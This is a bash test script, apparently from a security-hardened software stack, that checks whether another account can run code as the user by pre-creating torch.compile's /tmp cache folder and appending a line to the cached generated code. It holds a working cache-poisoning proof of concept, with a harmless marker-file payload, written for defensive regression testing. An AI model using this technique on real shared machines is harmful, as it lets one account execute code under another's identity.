#!/usr/bin/env bash
# Can another account get its code run as you through torch.compile's cache?
#
#   bash tests/compile-cache-attack.sh [PYTHON]
#
# Run as an ordinary user with sudo (it acts as `nobody` through sudo -u), on
# a machine with PyTorch and a C compiler. PYTHON defaults to the python3 a
# login shell finds. It plays both sides:
#   1. nobody creates /tmp/torchinductor_$USER first (any account can, after
#      every reboot empties /tmp), so nobody owns it;
#   2. you compile a small function, which fills the cache;
#   3. nobody swaps your cache subfolder for a copy with one added line;
#   4. you run the same code again: if the line ran, it ran as you.
# On M2 before the fix (finding 83) it printed VULNERABLE with your uid;
# Secure GPU Stack keeps the cache in ~/.cache and prints SAFE.
set -u
PY="${1:-python3}"
C="/tmp/torchinductor_$(id -un)"
MARK=/tmp/compile-cache-attack.ran
work=$(mktemp -d)
chmod 0755 "$work"   # nobody runs plant.py from here
cleanup() { sudo rm -rf "$C" "$MARK"; rm -rf "$work"; }
trap cleanup EXIT
sudo rm -rf "$C" "$MARK"

cat > "$work/compile.py" <<'PY'
import torch
@torch.compile
def f(x):
    return torch.nn.functional.gelu(x) * x.sin() + 1
print(float(f(torch.ones(1024)).sum()))
PY
cat > "$work/plant.py" <<'PY'
# nobody's side: swap the user's cached generated code for a copy with one more line.
import glob, os, shutil, sys
cache, mark = sys.argv[1], sys.argv[2]
code = [p for p in glob.glob(cache + "/*/*.py")]
if not code:
    sys.exit("no cached code in " + cache)
sub = os.path.dirname(code[0])
os.rename(sub, sub + ".orig")
shutil.copytree(sub + ".orig", sub)
with open(code[0], "a") as f:
    f.write("\nimport os\nopen(%r, 'w').write('uid=%%d' %% os.getuid())\n" % mark)
print("nobody replaced", sub)
PY

echo "== 1. nobody creates $C first"
sudo -u nobody mkdir -m 0777 "$C" || exit 1
echo "== 2. $(id -un) compiles"
bash -lc "\"$PY\" \"$work/compile.py\"" > /dev/null 2>&1 || { echo "torch.compile failed; is PyTorch installed with a C compiler?"; exit 1; }
if [ -z "$(sudo find "$C" -mindepth 1 -print -quit)" ]; then
  echo "SAFE: torch.compile wrote nothing into the folder nobody made (its cache is elsewhere)"
  exit 0
fi
echo "== 3. nobody swaps the cached code"
sudo -u nobody "$PY" -I "$work/plant.py" "$C" "$MARK" || { echo "SAFE: nobody couldn't swap it"; exit 0; }
echo "== 4. $(id -un) runs the same code again"
bash -lc "\"$PY\" \"$work/compile.py\"" > /dev/null 2>&1
if [ -f "$MARK" ]; then
  echo "VULNERABLE: nobody's code ran as $(id -un): $(cat "$MARK")"
  exit 1
fi
echo "SAFE: nobody's code didn't run"
